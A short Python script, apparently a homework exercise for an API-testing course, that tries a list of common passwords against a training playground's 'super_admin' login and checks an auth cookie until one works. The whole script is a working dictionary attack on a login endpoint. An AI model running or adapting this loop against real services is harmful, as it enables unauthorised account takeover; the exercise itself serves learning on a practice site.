import requests
import json

list_pass = ["123456", "123456789", "12345", "qwerty", "password", "1234567", "12345678", "12345",
             "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop",
             "654321", "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"]

for i in list_pass:
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": "super_admin", "password": i})
    cookies = dict(response1.cookies)
    response2 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response2.text == 'You are authorized':
        print(f"Верный пароль: {json.loads(response1.text)['password']}")
        break